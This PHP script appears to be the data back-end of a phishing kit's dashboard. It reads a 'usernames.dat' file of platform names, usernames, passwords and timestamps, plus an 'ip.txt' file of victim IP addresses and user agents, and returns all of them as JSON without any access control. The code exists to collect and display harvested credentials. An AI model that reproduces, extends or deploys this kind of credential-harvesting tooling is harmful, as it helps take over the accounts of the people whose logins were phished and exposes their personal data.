<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

header('Content-Type: application/json');

// Track issues
$errors = [];
$debugInfo = [];

// Will hold all our data
$credentialsData = [];
$ipData = [];
$combinedData = [];

// Process credentials file
// Find this section in get_data.php
$credentialsFile = './usernames.dat';
if (file_exists($credentialsFile) && is_readable($credentialsFile)) {
    try {
        $content = file_get_contents($credentialsFile);
        if ($content !== false) {
            $lines = explode("\n", $content);
            foreach ($lines as $line) {
                if (trim($line) === '') continue;
                $parts = explode(':', $line);
                
                // Clean up the platform name - remove "Username" from it
                $platform = isset($parts[0]) ? $parts[0] : 'Unknown';
                $platform = str_replace(' Username', '', $platform);
                
                // Clean up the username - remove "Pass" from it
                $username = isset($parts[1]) ? $parts[1] : 'Unknown';
                $username = str_replace(' Pass', '', $username);
                
                $credentialsData[] = [
                    'platform' => $platform,
                    'username' => $username,
                    'password' => $parts[2] ?? 'Unknown',
                    'timestamp' => $parts[3] ?? date('Y-m-d H:i:s')
                ];
            }
        }
    } catch (Exception $e) {
        $errors[] = "Exception reading credentials: " . $e->getMessage();
    }
} else {
    $errors[] = "Credentials file not found or not readable";
}

// Process IP file
$ipFile = './ip.txt';
if (file_exists($ipFile) && is_readable($ipFile)) {
    try {
        $content = file_get_contents($ipFile);
        if ($content !== false) {
            // Split content into lines
            $lines = explode("\n", $content);
            
            // Process pairs of lines (IP and User-Agent)
            for ($i = 0; $i < count($lines) - 1; $i += 2) {
                $ipLine = trim($lines[$i]);
                $uaLine = isset($lines[$i+1]) ? trim($lines[$i+1]) : '';
                
                // Check if this is an IP line
                if (strpos($ipLine, 'IP:') === 0) {
                    $ip = trim(substr($ipLine, 3)); // Remove "IP: " prefix
                    
                    // Check if the next line is a User-Agent line
                    if (strpos($uaLine, 'User-Agent:') === 0) {
                        $userAgent = trim(substr($uaLine, 11)); // Remove "User-Agent: " prefix
                        
                        // Add to data array
                        $ipData[] = [
                            'ip' => $ip,
                            'userAgent' => $userAgent,
                            'date' => date('Y-m-d H:i:s') // No timestamp in file, use current time
                        ];
                    }
                }
            }
        }
    } catch (Exception $e) {
        $errors[] = "Exception reading IP data: " . $e->getMessage();
    }
} else {
    $errors[] = "IP file not found or not readable";
}

// Create combined data based on the request type
$type = $_GET['type'] ?? '';

// For simplicity, just return all data regardless of type parameter
$response = [
    'success' => empty($errors),
    'credentials' => $credentialsData,
    'ipData' => $ipData,
    'errors' => $errors
];

echo json_encode($response);
?>
